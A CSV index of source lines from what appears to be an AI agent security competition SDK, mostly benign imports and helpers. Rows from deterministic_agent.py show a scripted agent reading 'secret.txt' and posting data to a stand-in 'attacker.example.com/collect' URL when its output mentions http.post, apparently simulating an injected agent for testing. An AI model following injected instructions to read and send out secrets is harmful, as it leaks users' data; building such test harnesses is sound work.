relative_path,line,terms,source_text,source_line_sha256
aicomp_sdk/agents/__init__.py,61,normalize,"normalize_parsed_response,",57585B6C140C76BC2289A3B6ADD407F07BD756221C21EE500F432BF260A44A60
aicomp_sdk/agents/__init__.py,62,normalize,"normalize_tool_arguments,",5D5F8C0A1F2943ACF814564ED0FA78DCDE0BBE6A657EC47FB4F54D66B8BEFC74
aicomp_sdk/agents/__init__.py,94,normalize,"""normalize_parsed_response"",",B6B00546F447F9C65CD90809522AE108FA04A26ED7AC3CB14CF03C6DEEFE0AFE
aicomp_sdk/agents/__init__.py,95,normalize,"""normalize_tool_arguments"",",2246A61E513C2F3315E4F84DF2798BADFDA94BE163869E9DFFCB1B5D8C9C0908
aicomp_sdk/agents/debug.py,5,data,"from dataclasses import asdict, dataclass, field, is_dataclass",E0B08005D4FCC131F68E5573AE5C343B5237AD406FC4BAEF96695C727EE79120
aicomp_sdk/agents/debug.py,6,path,from pathlib import Path,6D69F2AC09017B8A49D050AB336E953B8FA02AE08C24396916EA7EA42418E627
aicomp_sdk/agents/debug.py,32,data,@dataclass(frozen=True),6B38C9A9ED64FCD7602BBA1EFAE5A3586F70A4A4743870B5A2C05E97C0612544
aicomp_sdk/agents/debug.py,70,path,"def __init__(self, path: Path) -> None:",32164109D31C8DBF0FB57713EEFCE8CA71A88FB8E88EABDC65125B4AA7F963A1
aicomp_sdk/agents/debug.py,71,path,self.path = Path(path),7F10BF5BBDF9DB9E56AA25F03CAFAEE9461928F4FD97525514B0F5E59DB449EC
aicomp_sdk/agents/debug.py,72,path,"self.path.parent.mkdir(parents=True, exist_ok=True)",5D0D96F412D429215075CA237AE2160C6C3614886107121EBE139BD7FD22C4BF
aicomp_sdk/agents/debug.py,73,path,"self.path.write_text("""", encoding=""utf-8"")",CBBA5259FF0487D7617886CB6360D1787F8B970C0F0885F8086169F38DD4ED7B
aicomp_sdk/agents/debug.py,76,path,"with self.path.open(""a"", encoding=""utf-8"") as handle:",14650644CA10142776250D59209407E91561F78F503660F555A65DE25BC2A7C7
aicomp_sdk/agents/debug.py,98,path,"if isinstance(value, Path):",6E286E89FBAED565E4CAB2CE59F08E5250FCCE2CD68248BBAD287FC83B75B66F
aicomp_sdk/agents/debug.py,100,data,"if is_dataclass(value) and not isinstance(value, type):",792DD9C36CC2B64DF70958138E2290F31423B61835732444E673D2F0E3B1ED09
aicomp_sdk/agents/debug.py,193,normalize,"normalized = "" "".join(text.split())",F37B6644550363176246984FC0396E84584F3D6C216971744849E2C2DF679F1D
aicomp_sdk/agents/debug.py,194,normalize,if len(normalized) <= _TEXT_PREVIEW_LIMIT:,8467445D725347561E2558C84AC37E276F1423A8478B200094C6474708E150A0
aicomp_sdk/agents/debug.py,195,normalize,return normalized,232157CECD9C124317C99BCEC4E2C9C31E6C3DA898CAECEBE5183AA233B31613
aicomp_sdk/agents/debug.py,196,normalize,"return normalized[:_TEXT_PREVIEW_LIMIT] + ""...""",6E8253E0F8F9B9EC013A65B94023905732B0A64DDC3C85C76FC9CE1A4FB5E0F7
aicomp_sdk/agents/deterministic_agent.py,27,url,"_URL_RE: Final[re.Pattern[str]] = re.compile(r'https?://[^\s\'""<>]+')",0284FCF4CF069AAD724E762FB0722A419F42DAD6B7C2EC846BDED61CF41BEF4D
aicomp_sdk/agents/deterministic_agent.py,96,url,"def _find_url(self, output: str) -> str | None:",CCF5E57940D6FEADFE8BB5106EC30D601382CFF7505421FCB56E35F1E0A76EAB
aicomp_sdk/agents/deterministic_agent.py,97,url,match = _URL_RE.search(output),BB189F0A8CC1ED5ECE4C23FF7F74F404DC8FCFD5AEE60C81201470619014A826
aicomp_sdk/agents/deterministic_agent.py,103,path,"for keyword, path in _READ_FILE_TARGETS:",3D6C1131377244E0CDB850A998C9C63D16F10EF40F651D8D6B141C91499FD1CC
aicomp_sdk/agents/deterministic_agent.py,105,tool_call|fs.read|path,"return self._tool_call(""fs.read"", {""path"": path}, ""read_file"")",FABE49FEDD3FE532669F68279257B1A2A8D9308ACB029644B948E1F287C9088D
aicomp_sdk/agents/deterministic_agent.py,107,tool_call|fs.read|secret.txt|path,"return self._tool_call(""fs.read"", {""path"": ""secret.txt""}, ""read_file"")",150CBBF5ACFECB63C6BEA9EA0CF83B65BCE0FF99D5CE6063FC8225BD2CC74A73
aicomp_sdk/agents/deterministic_agent.py,116,normalize,"normalized_message = message.replace("" "", ""_"")",DFC398B34DFBBA16DDC735F9EBDB550A9F5A050CCAD7CCCF598AF10EB89FD0A6
aicomp_sdk/agents/deterministic_agent.py,118,normalize,if page_id in normalized_message:,7C5066079A310F8D8ED8D4805E46E1F1ACD1C99CE575BC22B73B037A3FBF01B1
aicomp_sdk/agents/deterministic_agent.py,142,fs.read,"""fs.read"",",E9898A57ACB30358FCD4918C99E6BB4445B9C37D03E1869E313D110E6F519E08
aicomp_sdk/agents/deterministic_agent.py,143,secret.txt|path,"{""path"": ""secret.txt""},",03A81593BC97B42DFFD16FD8D1C179E38A57AB9D9E15CC3862C9E3BA97E4C22B
aicomp_sdk/agents/deterministic_agent.py,147,http.post,"if ""http.post"" in output_lower or (",85FC8F5BE8FAE42C41FB8C2CB6FE915A437C71F74DEE2924B5B523E89A6996BD
aicomp_sdk/agents/deterministic_agent.py,150,url,"url = self._find_url(output) or ""https://attacker.example.com/collect""",04E4A21227D4F58AB59A2B27F093E029B3C5F16765DC7B3A2C0C5DEF332AC02B
aicomp_sdk/agents/deterministic_agent.py,152,http.post,"""http.post"",",AFFA57F7E74AA111AD654C4F501DC0397FDC4A30F4315FCF49A1C2DB49E37E05
